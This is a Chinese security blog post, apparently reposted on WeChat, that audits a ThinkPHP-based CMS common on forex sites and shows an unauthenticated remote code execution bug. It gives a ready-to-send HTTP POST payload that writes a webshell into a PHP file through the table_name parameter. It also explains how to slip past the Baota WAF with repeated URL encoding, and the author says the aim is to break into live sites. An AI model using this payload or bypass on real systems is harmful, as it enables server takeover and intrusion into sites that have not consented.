#  实战 | 某外汇常用CMS通用未授权RCE   
 系统安全运维   2024-08-25 10:36  
  
> 某妞子发给我的一个cms，有各种注入，但是网上大部分站点都是用宝塔搭建的，并且开了waf的功能，索性审一个rce直接日下。  
  
  
程序是基于ThinkPHP3.1.3进行二次开发的，直接根据特征从Github找了个源代码下来审，注入就不说了，直接看RCE：  
  
Admin/Lib/Action/typeAction.class.php  
```
public function add_save()
{
        $data=pg('data');
        M('classify_type')->data($data)->add();
 
        $sql='
        CREATE TABLE index_'.$data['table_name'].' (
          '.$data['table_name'].'_id int(10) NOT NULL AUTO_INCREMENT,
          type_id int(10) NOT NULL,
          date int(10) NOT NULL,
          title varchar(99) NOT NULL,
          keywords varchar(99) NOT NULL,
          description varchar(10) NOT NULL,
          version_id int(10) NOT NULL,
          PRIMARY KEY ('.$data['table_name'].'_id)
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8;';
        M()->query($sql);
 
        if(!file_exists('Index/Lib/Action/'.$data['table_name'].'Action.class.php'))
        {
            copy('Index/Lib/Action/messageAction.class.php','Index/Lib/Action/'.$data['table_name'].'Action.class.php');
            $content=read_file('Index/Lib/Action/'.$data['table_name'].'Action.class.php');
            $content=str_replace('messageAction',$data['table_name'].'Action',$content);
            write_file('Index/Lib/Action/'.$data['table_name'].'Action.class.php',$content);
            copy_dir('Index/Tpl/message','Index/Tpl/'.$data['table_name']);
        }
 
        echo '操作成功';
    }
```  
  
直接从参数获取data数组，没有任何检验/过滤/认证，后面用了write_file函数，跟进去看看  
  
ThinkPHP/Common/common.php  
```
function write_file($path,$data)
{
    creat_file($path);
    $fp=fopen($path,"w+");
    if(!fwrite($fp,$data))
    {
        return false;
    }
    else
    {
        fclose($fp);
        return true;
    }
}
```  
  
很简单的一个函数，根据参数直接写文件，再回头看看刚才的代码：  
```
write_file('Index/Lib/Action/'.$data['table_name'].'Action.class.php',$content);
```  
  
文件名是php格式，如果$content可控，那就直接RCE了，$content内容是复制Index/Lib/Action/messageAction.class.php的，然后根据指定参数进行替换，先看下代码：  
  
Index/Lib/Action/messageAction.class.php  
```
<?php
class messageAction extends Action {
    public function index(){
        $this->display();
    }
 
    public function details(){
        $this->display();
    }
    public function add_save()
{
        $data = pg('data');
        $type_id = $data['type_id'];
        $classify_id = pg('classify_id');
        $table_name = M('classify_type')->where(array('type_id' => $type_id))->getField('table_name');
        $content = M($table_name)->where(array($table_name.'_id' => $content_id))->select();
        $list = M('input')->where(array('type_id' => $type_id, 'show_switch' => 2, 'input_type_id' => 4))->select();
        foreach($list as $k => $v){
            $data[$v['field_name']]=serialize($data[$v['field_name']]);
        }
 
        $list = M('input')->where(array('type_id' => $type_id, 'show_switch' => 2, 'input_type_id' => 7))->select();
        foreach($list as $k => $v){
            if(!empty($_FILES[$v['field_name']]['tmp_name'])){
                $data[$v['field_name']] = $this->up_file(array('name' => $v['field_name']));
            }
        }
 
        $list = M('input')->where(array('type_id' => $type_id, 'show_switch' => 2, 'input_type_id' => 8))->select();
        foreach($list as $k => $v)
        {
            $data[$v['field_name']]=strtotime($data[$v['field_name']]);
        }
 
        $id = M($table_name)->data($data)->add();
        M('relevance')->data(array('classify_id'=> $classify_id, 'content_id' => $id, 'main_id' => 1, 'type_id' => $type_id))->add();
        $this->success('提交成功');
    }
}
```  
  
也就是第二行的messageAction会替换成参数指定的，但是文件名同时也会被修改，所以很多Payload在这边是没办法使用的，然后还有一个宝塔WAF要绕过，直接给Payload：  
```
POST /admin.php?m=type&a=add_save HTTP/1.1
Host: www.xxx.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0
Accept: */*
Accept-Language: zh-TW,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Content-Length: 205
Connection: close
Pragma: no-cache
Cache-Control: no-cache
 
data%5Bdate%5D=1606456937&data%5Btype_name%5D=123&data%5Btable_name%5D=abc{}call_user_func_array($_REQUEST[a],array($_REQUEST[b][0],urldecode(urldecode($_REQUEST[b][1])))); class &data%5Bpage_name%5D=index

```  
  
大部分的函数在流量就被拦截了，但是他忽略了urlencode，只需要多弄几个urlencode就可以绕过流量了。  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/IXOicg347dAjzwOeInc5KGZZic5tCvIfa3QIWdGKM1AQVn6Tu0N7h9CAHW8UthB4ic9U4vPZvjpKaXzwb2s6748Xw/640?wx_fmt=jpeg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
最后建立的文件长这样：  
```
http://www.xxx.com/Index/Lib/Action/abc{}call_user_func_array($_REQUEST[a],array($_REQUEST[b][0],urldecode(urldecode($_REQUEST[b][1])))); class Action.class.php
```  
```
<?php
class abc{}call_user_func_array($_REQUEST[a],array($_REQUEST[b][0],urldecode(urldecode($_REQUEST[b][1])))); class Action extends Action {
    public function index(){
        $this->display();
    }
 
    public function details(){
        $this->display();
    }
    public function add_save()
{
        $data = pg('data');
        $type_id = $data['type_id'];
        $classify_id = pg('classify_id');
        $table_name = M('classify_type')->where(array('type_id' => $type_id))->getField('table_name');
        $content = M($table_name)->where(array($table_name.'_id' => $content_id))->select();
        $list = M('input')->where(array('type_id' => $type_id, 'show_switch' => 2, 'input_type_id' => 4))->select();
        foreach($list as $k => $v){
            $data[$v['field_name']]=serialize($data[$v['field_name']]);
        }
 
        $list = M('input')->where(array('type_id' => $type_id, 'show_switch' => 2, 'input_type_id' => 7))->select();
        foreach($list as $k => $v){
            if(!empty($_FILES[$v['field_name']]['tmp_name'])){
                $data[$v['field_name']] = $this->up_file(array('name' => $v['field_name']));
            }
        }
 
        $list = M('input')->where(array('type_id' => $type_id, 'show_switch' => 2, 'input_type_id' => 8))->select();
        foreach($list as $k => $v)
        {
            $data[$v['field_name']]=strtotime($data[$v['field_name']]);
        }
 
        $id = M($table_name)->data($data)->add();
        M('relevance')->data(array('classify_id'=> $classify_id, 'content_id' => $id, 'main_id' => 1, 'type_id' => $type_id))->add();
        $this->success('提交成功');
    }
}
```  
```
作者：hzllaga
来源：https://wtfsec.org/posts/%e6%9f%90%e5%a4%96%e6%b1%87%e5%b8%b8%e7%94%a8cms%e9%80%9a%e7%94%a8%e6%9c%aa%e6%8e%88%e6%9d%83rce/
如有侵权，请联系删除
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
如有侵权，请联系删除  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QO6oDpE0HEmt8Ss52ibJFcYB7ZHBRVbIpxr9XXibHdW6Eib11FYq0FDZFNMUgDMcqTyfs6iaX8OtFdlL6ypEVHCLrw/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
好文推荐  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QO6oDpE0HEmt8Ss52ibJFcYB7ZHBRVbIpzdIMlC9plAr8AiaQRUUvBFXZM2scib9zTnRyp0XZQxSUYAWWS0avKrCA/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
[红队打点评估工具推荐](http://mp.weixin.qq.com/s?__biz=Mzk0NjE0NDc5OQ==&mid=2247508839&idx=1&sn=abc801070b0e44475887ddbf7273c2e7&chksm=c3087017f47ff901ecb212aadc22c5cbfc6407da79b43a6f48a355cc3fd8c5af79c113db5fd1&scene=21#wechat_redirect)  
  
  
[干货|红队项目日常渗透笔记](http://mp.weixin.qq.com/s?__biz=Mzk0NjE0NDc5OQ==&mid=2247509256&idx=1&sn=76aad07a0f12d44427ce898a6ab2769e&chksm=c3087678f47fff6e2b750f41514d933390a8f97efef8ed18af7d8fb557500009381cd434ec26&scene=21#wechat_redirect)  
  
  
[实战|后台getshell+提权一把梭](http://mp.weixin.qq.com/s?__biz=Mzk0NjE0NDc5OQ==&mid=2247508609&idx=1&sn=f3fcd8bf0e75d43e3f26f4eec448671f&chksm=c30871f1f47ff8e74551b09f092f8673890607257f2d39c0efa314d1888a867dc718cc20b7b3&scene=21#wechat_redirect)  
  
  
[一款漏洞查找器（挖漏洞的有力工具）](http://mp.weixin.qq.com/s?__biz=Mzk0NjE0NDc5OQ==&mid=2247507539&idx=2&sn=317a2c6cab28a61d50b22c07853c9938&chksm=c3080d23f47f8435b31476b13df045abaf358fae484d8fbe1e4dbd2618f682d18ea44d35dccb&scene=21#wechat_redirect)  
  
  
[神兵利器 | 附下载 · 红队信息搜集扫描打点利器](http://mp.weixin.qq.com/s?__biz=Mzk0NjE0NDc5OQ==&mid=2247508747&idx=1&sn=f131b1b522ee23c710a8d169c097ee4f&chksm=c308707bf47ff96dc28c760dcd62d03734ddabb684361bd96d2f258edb0d50e77cdb63a3600a&scene=21#wechat_redirect)  
  
  
[神兵利器 | 分享 直接上手就用的内存马（附下载）](http://mp.weixin.qq.com/s?__biz=Mzk0NjE0NDc5OQ==&mid=2247506855&idx=1&sn=563506565571f1784ad1cb24008bcc06&chksm=c30808d7f47f81c11b8c5f13ce3a0cc14053a77333a251cd6b2d6ba40dc9296074ae3ffd055e&scene=21#wechat_redirect)  
  
  
[推荐一款自动向hackerone发送漏洞报告的扫描器](http://mp.weixin.qq.com/s?__biz=Mzk0NjE0NDc5OQ==&mid=2247501261&idx=1&sn=0ac4d45935842842f32c7936f552ee21&chksm=c30816bdf47f9fab5900c9bfd6cea7b1d99cd32b65baec8006c244f9041b25d080b2f23fd2c1&scene=21#wechat_redirect)  
  
  
  
**关注我，学习网络安全不迷路**  
  
  
**求点赞关注～**  
  
